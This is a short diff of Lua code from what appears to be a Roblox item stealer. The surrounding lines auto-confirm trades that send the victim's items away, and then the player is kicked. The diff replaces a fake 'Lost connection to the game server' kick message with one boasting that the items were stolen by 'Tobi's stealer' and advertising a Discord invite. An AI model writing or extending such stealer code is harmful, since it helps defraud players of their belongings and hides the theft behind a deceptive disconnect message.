@@ -418,7 +418,7 @@ if #itemsToSend > 0 then
             readyTrade()
             confirmTrade()
         end
-        plr:kick("Lost connection to the game server, please reconnect")
+        plr:kick("All your stuff just got stolen by Tobi's stealer. discord.gg/GY2RVSEGDT")
     end
 
     local function waitForUserJoin()
